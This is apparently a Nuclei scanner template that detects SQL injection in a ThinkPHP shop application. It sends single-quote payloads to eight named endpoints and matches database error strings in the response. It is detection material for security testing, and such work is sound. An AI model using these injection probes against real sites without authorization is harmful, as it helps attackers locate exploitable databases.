id: thinkphp-multi-sql-injection
info:
  name: ThinkPHP Multiple SQL Injection Vulnerabilities
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection,thinkphp

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=/home/shopcart/getPricetotal/tag/1%27"
      - "{{BaseURL}}/index.php?s=/home/shopcart/getpriceNum/id/1%27"
      - "{{BaseURL}}/index.php?s=/home/user/cut/id/1%27"
      - "{{BaseURL}}/index.php?s=/home/service/index/id/1%27"
      - "{{BaseURL}}/index.php?s=/home/pay/chongzhi/orderid/1%27"
      - "{{BaseURL}}/index.php?s=/home/order/complete/id/1%27"
      - "{{BaseURL}}/index.php?s=/home/order/detail/id/1%27"
      - "{{BaseURL}}/index.php?s=/home/order/cancel/id/1%27"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SQL syntax"
          - "Driver.class.php"
          - "FILE:"
          - "TRACE"
